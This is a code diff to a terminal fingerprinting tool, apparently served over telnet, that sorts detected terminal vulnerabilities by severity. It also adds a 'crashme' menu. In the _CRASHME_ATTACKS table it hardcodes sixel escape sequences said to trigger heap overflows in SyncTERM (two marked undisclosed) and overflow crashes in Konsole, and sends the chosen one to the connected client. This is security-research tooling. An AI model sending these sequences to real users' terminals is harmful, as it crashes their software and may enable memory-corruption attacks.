@@ -553,28 +553,44 @@ def _build_vulnerabilities_rows(
     Only vulnerabilities that are actually detected are shown. CVE identifiers are on the left,
     descriptions with the affected protocol/sequence in parentheses on the right.
     """
-    pairs: List[Tuple[str, str]] = []
+    high: List[Tuple[str, str]] = []
+    medium: List[Tuple[str, str]] = []
+    low: List[Tuple[str, str]] = []
 
-    # DECRQCRA screen scraping -- no CVE assigned, reference Leadbeater 2023
-    scrape = data.get("screen-scrape")
-    if scrape:
+    # Detect SyncTERM for SyncTERM-specific vulnerabilities
+    telnet_probe = data.get("telnet-probe", {})
+    _extra = telnet_probe.get("session_data", {}).get("extra", {})
+    _is_syncterm = "syncterm" in (_extra.get("TERM") or "").lower()
+
+    _high = term.bold_firebrick1
+    _med = term.darkorange
+    _low = term.yellowgreen
+
+    # -- HIGH --
+
+    # DECRQSS injection
+    injection = data.get("injection_probe")
+    if injection and injection.get("injectable"):
         ref = _osc8(_DECRQCRA_REF_URL, "Leadbeater 2023")
-        # New format: top-level screen-scrape.decrqcra bool from fingerprint server
-        if scrape.get("decrqcra"):
-            pairs.append((ref, term.darkorange("Supported (DECRQCRA screen scraping)")))
-        # Legacy format: screen-scrape subprocess with captured content
-        elif scrape.get("screen_0") or scrape.get("screen_1"):
-            pairs.append((ref, term.bold_firebrick1("Vulnerable to screen scraping (DECRQCRA)")))
-        elif "decrqcra" not in scrape:
-            pairs.append((ref, term.darkorange("Supported, no content captured (DECRQCRA)")))
+        high.append((ref, f"{_high('[HIGH]')} {_high('Response injection (DECRQSS)')}"))
 
-    # NEW_ENVIRON oversharing -- two tiers
+    # SyncTERM sixel crashes (2 and 3 are HIGH)
+    if _is_syncterm:
+        high.append((
+            "undisclosed (2)",
+            f"{_high('[HIGH]')} {_high('Heap overflow (undersized alloc)')}",
+        ))
+        high.append((
+            "undisclosed (3)",
+            f"{_high('[HIGH]')} {_high('Heap overflow (zero-size alloc)')}",
+        ))
+
+    # -- MEDIUM --
+
+    # NEW_ENVIRON oversharing
     telnet_probe = data.get("telnet-probe", {})
     session_data = telnet_probe.get("session_data", {})
     extra = session_data.get("extra", {})
-    # Only consider uppercase keys -- lowercase keys (charset, cols, rows,
-    # tspeed, xdisploc, timeout) are internal extra_info metadata, not
-    # NEW_ENVIRON variables.
     env_keys = [k for k in extra if k == k.upper() and extra[k]]
     critical = sorted(k for k in env_keys if k in _CRITICAL_ENV_VARS)
     overshared = sorted(
@@ -586,19 +602,16 @@ def _build_vulnerabilities_rows(
         + _osc8(_CVE_2005_1205_URL, "CVE-2005-1205")
     )
     if critical:
-        pairs.append(
-            (cve_refs, term.bold_firebrick1("LEAKED: " + ", ".join(critical) + " (NEW_ENVIRON)"))
+        high.append(
+            (cve_refs, f"{_high('[HIGH]')} {_high('LEAKED: ' + ', '.join(critical) + ' (NEW_ENVIRON)')}")
         )
     if overshared:
-        pairs.append(
-            (
-                cve_refs if not critical else "",
-                term.darkorange("Oversharing: " + ", ".join(overshared) + " (NEW_ENVIRON)"),
-            )
-        )
+        low.append((
+            cve_refs if not critical else "",
+            f"{_low('[LOW]')} {_low('Oversharing: ' + ', '.join(overshared) + ' (NEW_ENVIRON)')}",
+        ))
 
-    # CVE probes from vt-houdini — check top-level (fingerprint server)
-    # then fall back to nested path (legacy ucs-detect)
+    # CVE probes from vt-houdini
     cve_results = data.get("cve_results")
     if not cve_results:
         terminal_probe = data.get("terminal-probe", {})
@@ -609,12 +622,35 @@ def _build_vulnerabilities_rows(
         )
     for cve_id, result in sorted(cve_results.items()):
         if result and result is not False:
-            escaped = result if isinstance(result, str) else repr(result)
             url = f"https://nvd.nist.gov/vuln/detail/{cve_id}"
             label = _osc8(url, cve_id)
-            pairs.append((label, term.bold_firebrick1("Vulnerable: " + escaped)))
+            medium.append((label, f"{_med('[MEDIUM]')} {_med('Vulnerable')}"))
 
-    return pairs
+    # -- LOW (screen scraping) --
+
+    sts_probe = data.get("sts_probe")
+    scrape = data.get("screen-scrape")
+    if sts_probe and sts_probe.get("sts"):
+        ref = _osc8(_DECRQCRA_REF_URL, "Leadbeater 2023")
+        if scrape and scrape.get("method") == "sts":
+            low.append((ref, f"{_low('[LOW]')} {_low('Screen scraping (STS)')}"))
+        else:
+            low.append((ref, f"{_low('[LOW]')} {_low('Screen scraping (STS) supported')}"))
+
+    decrqcra_probe = data.get("decrqcra_probe")
+    if not decrqcra_probe and scrape:
+        decrqcra_probe = scrape
+    if decrqcra_probe:
+        ref = _osc8(_DECRQCRA_REF_URL, "Leadbeater 2023") if not (sts_probe and sts_probe.get("sts")) else ""
+        if decrqcra_probe.get("decrqcra"):
+            if scrape and (scrape.get("screen_0") or scrape.get("screen_1")):
+                low.append((ref, f"{_low('[LOW]')} {_low('Screen scraping (DECRQCRA)')}"))
+            else:
+                low.append((ref, f"{_low('[LOW]')} {_low('Screen scraping (DECRQCRA) supported')}"))
+        elif scrape and scrape.get("method") != "sts" and "decrqcra" not in (scrape or {}):
+            low.append((ref, f"{_low('[LOW]')} {_low('Screen scraping (DECRQCRA) supported')}"))
+
+    return high + medium + low
 
 
 def _make_terminal(**kwargs: Any) -> "blessed.Terminal":
@@ -767,7 +803,7 @@ def _display_compact_summary(
 
     vuln_rows = _build_vulnerabilities_rows(term, data)
     if vuln_rows:
-        vuln_count = sum(1 for k, v in vuln_rows if k and "ulnerable" in v)
+        vuln_count = len(vuln_rows)
         vuln_title = "Vulnerabilities"
         if vuln_count:
             vuln_title += f" ({vuln_count})"
@@ -1030,14 +1066,24 @@ def _nearest_match_lines(
     return result_lines
 
 
-def _repl_prompt(term: "blessed.Terminal") -> None:
+def _repl_prompt(
+    term: "blessed.Terminal",
+    is_syncterm: bool = False,
+    is_konsole: bool = False,
+) -> None:
     """Write the REPL prompt with command legend."""
     bk = _bracket_key
-    legend = (
-        f"{bk(term, 't')}erminal or te{bk(term, 'l')}net details, "  # codespell:ignore te
-        f"{bk(term, 's')}ummarize or {bk(term, 'u')}pdate database, "
-        f"{bk(term, 'q')}uit"
-    )
+    lines = [
+        f"{bk(term, 't')}ERM or TE{bk(term, 'l')}NET details?",  # codespell:ignore te
+        f"{bk(term, 's')}ummarize, {bk(term, 'u')}pdate, or s{bk(term, 'h')}ow DB",
+    ]
+    if is_syncterm:
+        lines.append(f"{bk(term, 'c')}rash SyncTERM?! {bk(term, 'q')}uit")
+    elif is_konsole:
+        lines.append(f"{bk(term, 'c')}rash Konsole?! {bk(term, 'q')}uit")
+    else:
+        lines.append(f"{bk(term, 'q')}uit")
+    legend = "\r\n".join(lines)
     echo(f"\r{term.clear_eos}{term.normal}{legend}\r\n: ")
 
 
@@ -1237,6 +1283,85 @@ def _filter_telnet_detail(detail: Optional[Dict[str, Any]]) -> Optional[Dict[str
     return result
 
 
+_CRASHME_ATTACKS = {
+    "2": {
+        "name": "Heap overflow (undersized alloc)",
+        "severity": "HIGH",
+        "target": "SyncTerm/CTerm",
+        "sequence": '\x1bP0;0;0q"186414;1;640;350' + '~' * 512 + '\x1b\\',
+    },
+    "3": {
+        "name": "Heap overflow (zero-size alloc)",
+        "severity": "HIGH",
+        "target": "SyncTerm/CTerm",
+        "sequence": '\x1bP0;0;0q"8388608;1;640;350' + '~' * 100 + '\x1b\\',
+    },
+    "4": {
+        "name": "Sixel aspect ratio OOM crash",
+        "severity": "LOW",
+        "target": "Konsole",
+        "sequence": '\x1bP0;0;0q"500000;1;64;6' + '~' * 64 + '\x1b\\',
+    },
+    "5": {
+        "name": "Sixel aspect ratio int overflow",
+        "severity": "LOW",
+        "target": "Konsole",
+        "sequence": '\x1bP0;0;0q"7000000;1;8;350' + '~' * 8 + '\x1b\\',
+    },
+}
+
+_SEVERITY_COLOR = {
+    "LOW": "bold_gold1",
+    "MEDIUM": "darkorange",
+    "HIGH": "bold_firebrick1",
+}
+
+
+def _crashme_prompt(
+    term: "blessed.Terminal",
+    is_syncterm: bool = False,
+    is_konsole: bool = False,
+) -> Optional[str]:
+    """Show crashme menu filtered by detected terminal."""
+    echo = functools.partial(print, end="", flush=True)
+    targets: set[str] = set()
+    if is_syncterm:
+        targets.add("SyncTerm/CTerm")
+    if is_konsole:
+        targets.add("Konsole")
+    available = {
+        k: v for k, v in _CRASHME_ATTACKS.items()
+        if v.get("target") in targets
+    }
+    if not available:
+        echo(f"\r\n{term.bold('No attacks available for this terminal.')}\r\n")
+        return None
+    echo(f"\r\n{term.bold('Select a risky crash !')}\r\n\r\n")
+    for key in sorted(available):
+        attack = available[key]
+        sev = attack["severity"]
+        color_fn = getattr(term, _SEVERITY_COLOR.get(sev, "normal"))
+        sev_str = color_fn(f"[{sev}]")
+        target = attack.get("target", "")
+        target_str = f" ({target})" if target else ""
+        echo(f"  ({term.bold(key)}) {sev_str} {attack['name']}{target_str}\r\n")
+    echo(f"\r\n: ")
+    key = str(term.inkey(timeout=None)).strip()
+    if key in available:
+        return key
+    return None
+
+
+def _execute_crash(term: "blessed.Terminal", key: str) -> None:
+    """Execute a crashme attack by letter key."""
+    echo = functools.partial(print, end="", flush=True)
+    attack = _CRASHME_ATTACKS[key]
+    echo(f"\r\n{term.bold_firebrick1('Crash')}: {attack['name']}...\r\n")
+    sys.stdout.buffer.write(attack["sequence"].encode("latin-1"))
+    sys.stdout.buffer.flush()
+    echo(f"{term.bold('Sent.')} The client may have crashed.\r\n")
+
+
 def _show_detail(term: "blessed.Terminal", data: Dict[str, Any], section: str) -> None:
     """Show detailed JSON for a fingerprint section with pagination."""
     if section == "terminal":
@@ -1368,14 +1493,30 @@ def _fingerprint_repl(
 ) -> None:
     """Interactive REPL for exploring fingerprint data."""
     ip = _client_ip(data)
+
+    # Detect SyncTERM by TERM env var or TTYPE
+    telnet_probe = data.get("telnet-probe", {})
+    session_data = telnet_probe.get("session_data", {})
+    extra = session_data.get("extra", {})
+    ttype = (extra.get("TERM") or "").lower()
+    is_syncterm = "syncterm" in ttype
+
+    # Detect Konsole by XTVERSION software_name
+    terminal_session = data.get("terminal-probe", {}).get("session_data", {})
+    software_name = (terminal_session.get("software_name") or "").lower()
+    is_konsole = "konsole" in software_name
+
     _commands = {
         "q": "logoff",
         "t": "terminal-detail",
         "l": "telnet-detail",
-        "s": "database",
+        "s": "summarize",
         "u": "update",
+        "h": "database",
         "\x0c": "refresh",
     }
+    if is_syncterm or is_konsole:
+        _commands["c"] = "crashme"
 
     db_cache = None
     decrqss_tried = False
@@ -1385,7 +1526,7 @@ def _fingerprint_repl(
     decrqss_vulnerable = bool(cve_results.get("CVE-2008-2383"))
 
     while True:
-        _repl_prompt(term)
+        _repl_prompt(term, is_syncterm=is_syncterm, is_konsole=is_konsole)
         while term.inkey(timeout=0):
             pass
 
@@ -1408,6 +1549,10 @@ def _fingerprint_repl(
 
         cmd = _read_line(term).strip().lower()
 
+        if not cmd:
+            echo(f"\r: ")
+            continue
+
         if cmd in _commands:
             logger.info("%s: repl %s", ip, _commands[cmd])
         elif cmd:
@@ -1422,6 +1567,11 @@ def _fingerprint_repl(
         elif cmd == "l":
             _show_detail(term, data, "telnet")
         elif cmd == "s":
+            echo(term.normal + term.clear)
+            _display_compact_summary(data, term)
+            if seen_counts:
+                echo(seen_counts)
+        elif cmd == "h":
             if db_cache is None:
                 db_cache = _build_database_entries(names)
             _show_database(term, data, db_cache)
@@ -1430,6 +1580,10 @@ def _fingerprint_repl(
             _prompt_fingerprint_identification(term, data, filepath, _names)
             names = _load_fingerprint_names()
             seen_counts = _build_seen_counts(data, names, term)
+        elif cmd == "c" and (is_syncterm or is_konsole):
+            choice = _crashme_prompt(term, is_syncterm=is_syncterm, is_konsole=is_konsole)
+            if choice:
+                _execute_crash(term, choice)
         elif cmd == "\x0c":
             echo(term.normal + term.clear)
             _display_compact_summary(data, term)
